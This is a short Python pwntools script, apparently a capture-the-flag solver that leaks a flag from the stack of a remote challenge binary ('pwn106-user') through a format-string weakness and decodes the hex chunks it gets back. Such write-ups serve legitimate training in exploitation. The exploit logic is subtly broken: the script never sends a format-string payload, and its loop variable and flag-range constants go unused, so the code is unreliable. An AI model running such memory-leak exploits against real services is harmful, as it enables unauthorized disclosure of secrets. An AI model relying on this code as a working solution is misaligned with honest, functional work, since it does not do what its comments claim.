from pwn import *

elf = context.binary = ELF('./pwn106user.pwn106-user', checksec=False)
context.log_level = 'error'

flag_start = 6
flag_end = 12

MACHINE_IP = ''		# Change this
PORT = 9006

final = ""
for i in range(6, 12):
    try:
        p = remote(MACHINE_IP, PORT)

        result = p.recvall()
        
        # Result = 'Thanks <some value>\n', the following codes exctracts only the value and decodes it, then reverses it because endianess. Value is concatenated to a final string because the flag is spread accross multiple positions in the stack.
        result = str(result).split(' ')[1][:-3]
        result = bytes.fromhex(result).decode('ASCII')[::-1]
        final += result
        
        p.close()
    except EOFError:
        pass
        
print(final)
